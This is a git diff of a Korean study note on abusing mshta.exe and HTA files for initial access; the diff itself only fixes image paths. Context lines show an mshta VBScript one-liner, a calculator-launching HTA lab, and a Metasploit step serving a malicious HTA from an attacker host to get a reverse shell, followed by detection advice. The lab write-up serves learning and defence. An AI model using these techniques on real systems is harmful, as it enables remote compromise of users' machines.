@@ -6,7 +6,7 @@ Mshta.exe는 네트워크 프록시 인식 방식으로 HTML에 포함된 Window
 
 아래 트윗은 한 레드팀원이 몇일전에 올린 HTA를 관한 초기 침투가 아직도 많이 쓰이고 있다는것을 알수있다. 
 
-![](../../obsidian_resources/Pasted%20image%2020230501172222.png)
+![](../obsidian_resources/Pasted%20image%2020230501172222.png)
 
 
 ## 보안적인 측면
@@ -15,7 +15,8 @@ Mshta.exe는 네트워크 프록시 인식 방식으로 HTML에 포함된 Window
 아래 실습 예제는 굉장히 간단히 예제 임으로 "왜 제가 만든 악성 hta 파일이 다운받은 즉시 사라지나요?"와 같은 질문은 하지 말길 바란다. 기본적으로 윈도우 디펜더를 다끄고 진행하고 있기 때문에 아래 실습은 방어 우회를 거의 일체 생각하지 않았다 ^^. 
 
 기본적으로 아래 3 항목을 비활성화 한뒤 시작한다. 
-![](../../obsidian_resources/Pasted%20image%2020230501202117.png)
+
+![](../obsidian_resources/Pasted%20image%2020230501202117.png)
 
 Mitre Attack에서도 Mshta 실행을 하나의 테크닉으로 설명하고 있으며 굉장히 많은 APT그룹도 사용하고 있는 것을 알 수 있다.
 
@@ -28,7 +29,7 @@ mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("Cre
 
 HTA -> VBScript 코드를 실행할 수 있다는것 자체가 이미 오용되기에 충분한 시나리오다!
 
-![](../../obsidian_resources/Pasted%20image%2020230501210226.png)
+![](../obsidian_resources/Pasted%20image%2020230501210226.png)
 
 ## 실습 
 
@@ -97,7 +98,7 @@ HTA -> VBScript 코드를 실행할 수 있다는것 자체가 이미 오용되�
 </body>
 </html>
 HTML Application을 통해 계산기가 실행되는 것을 알 수 있다.
-![](../../obsidian_resources/Pasted%20image%2020230501171712.png)
+![](../obsidian_resources/Pasted%20image%2020230501171712.png)
 
 
 ## Metasploit 예제
@@ -113,11 +114,11 @@ HTML Application을 통해 계산기가 실행되는 것을 알 수 있다.
 ```
 
 공격자는 타겟이 악성 HTA를 다운받을 수 있게 Python HTTP Server를 포트 8080에 만들어 준다.
-![](../../obsidian_resources/Pasted%20image%2020230501175738.png)
+![](../obsidian_resources/Pasted%20image%2020230501175738.png)
 
 브라우저에서 http://192.168.137[.]131:8080/groot.hta 를 방문하여 파일을 다운받고 실행하면 타겟박스 (윈도우) 쉘을 얻을 수 있다.
 
-![](../../obsidian_resources/Pasted%20image%2020230501175551.png)
+![](../obsidian_resources/Pasted%20image%2020230501175551.png)
 
 ### 대응 방안
 - CMD에서 실행되는 난독화된 스크립트를 실행하는 mshta.exe는 이미 수상하기 때문에 아마 EDR 차원에서  이미 감지를 할수 있다. 또한 mshta.exe 실행 전후 실행도는 Process들을 살펴봐 .hta 파일의 출처와 목적을 확인하는 것이 중요하다.
